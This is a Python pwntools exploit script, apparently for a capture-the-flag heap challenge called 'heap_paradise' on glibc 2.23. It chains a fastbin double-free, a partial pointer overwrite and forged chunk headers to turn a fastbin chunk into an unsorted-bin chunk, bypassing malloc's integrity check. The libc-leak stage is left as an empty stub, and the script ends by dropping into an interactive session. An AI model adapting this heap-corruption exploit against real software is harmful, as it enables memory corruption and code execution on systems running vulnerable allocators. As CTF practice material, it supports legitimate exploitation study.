#!/usr/bin/env python3
from pwn import *

PAD = lambda n: b"a" * n
DUMMY = 0xdeadbeefdeadbeef
QWORD = 8
CHUNK_HDR = QWORD * 2

ld = ELF("ld-2.23.so")
elf = ELF("./heap_paradise_patched")
libc = ELF("./given/libc_64.so.6")

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    p = remote()
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        with open(f"/proc/{p.pid}/maps", "rb") as f:
            maps = f.read()
            f.close()
        regions = maps.split(b"\n")
        pie_base = None
        for region in regions:
            if b"heap_paradise_patched" in region:
                pie_base = int(region[:region.find(b"-")], 16)
                break
        if pie_base is None:
            quit()
        log.info(f"pie base: {hex(pie_base)}")
        log.info(f"metadata[0xf]: {hex(pie_base + 0x202040)}")
        gdb.attach(p, "\n".join([
            #f"b *{hex(pie_base + 0xdc6)}", # b4 free
            f"b *{hex(pie_base + 0xe26)}", # main's exit
        ]))

class FakeChunk:
    def __init__(self, size, prev_size=0, fwd=0, bck=0, nxt_fwd=0, nxt_bck=0):
        self.prev_size = prev_size
        self.size = size
        self.fwd = fwd
        self.bck = bck
        self.nxt_fwd = nxt_fwd
        self.nxt_bck = nxt_bck

    def dump_header(self, A=0, M=0, P=0):
        return p64(self.prev_size) + p64(self.size | P)

    def dump_allocated(self, A=0, M=0, P=0):
        return self.dump_header(A=A, M=M, P=P).ljust(self.size, b"\x00")


num_data = 0
def alloc_data(size, data):
    global num_data
    assert(len(data) <= size)
    assert(num_data < 15)

    p.sendlineafter(b"You Choice:", b"1")
    p.sendlineafter(b"Size :", str(size).encode())
    p.sendafter(b"Data :", data)
    idx = num_data
    num_data += 1
    return idx

def free_data(index):
    p.sendlineafter(b"You Choice:", b"2")
    p.sendlineafter(b"Index :", str(index).encode())

def fastbin_dup_into_unsortedbin(fastbin_chunk_size):
    """
    Goal: Free an unsortedbin chunk
    Fastbin dup while also accompishing the following steps (in commenmt)
    layout:
      | a_hdr |  ----- a data -----  | b_hdr |  ----- b data ----- |
                 |fake0_hdr| ------- fake0_data ------- |fake1_hdr|
              |  |                           |          |
               ^ fake_chunk_offset            ^ offset2
    """
    # Parameters
    unsortedbin_chunk_size = 0xa0
    fake_chunk_offset = 0x10

    # make request size algined for simplicity
    req_size = fastbin_chunk_size - 0x10
    log.info(f"Going to request {hex(req_size)} size")

    # step 1: fake a "fastbin chunk"
    fake0 = PAD(fake_chunk_offset) + FakeChunk(size=fastbin_chunk_size).dump_header(P=1)
    a = alloc_data(req_size, fake0)

    # step2: prepare "next unsortedbin chunk"
    offset2 = (fake_chunk_offset + unsortedbin_chunk_size) - (req_size + CHUNK_HDR)
    fake1 = PAD(offset2) + FakeChunk(size=0x20).dump_header(P=1)
    b = alloc_data(req_size, fake1)

    free_data(a)
    free_data(b)
    free_data(a)

    # overwrite the last byte to get the address
    alloc_data(req_size, p8(CHUNK_HDR + fake_chunk_offset)) # a
    alloc_data(req_size, p64(DUMMY)) # b
    alloc_data(req_size, p64(DUMMY)) # a

    # Step 3: transform fastbin chunk into unsortedbin chunk
    # we need to arbitrary write a fastbin chunk and then
    # make it into a unsortedbin chunk to bypass
    #       malloc(): memory corruption (fast)
    unsorted_chunk = alloc_data(req_size, p64(DUMMY))

    free_data(a)
    fake0 = PAD(fake_chunk_offset) + FakeChunk(size=unsortedbin_chunk_size).dump_header(P=1)
    alloc_data(req_size, fake0)
    free_data(unsorted_chunk)
    log.info(f"Successfully created a unsortedbin chunk at {unsorted_chunk}")

    return a, b, unsorted_chunk, fake_chunk_offset

def fsop_leak_libc(a, b, unsorted_chunk, fake_chunk_offset):
    log.info(f"At this point, heap {a, b, unsorted_chunk} is allocated")


def exploit():

    fastbin_chunk_size = 0x70
    info = fastbin_dup_into_unsortedbin(fastbin_chunk_size)
    a, b, unsorted_chunk, fake_chunk_offset = info

    fsop_leak_libc(a, b, unsorted_chunk, fake_chunk_offset)

    p.sendlineafter(b"You Choice:", b"3")
    p.interactive()

if __name__ == "__main__":
    exploit()
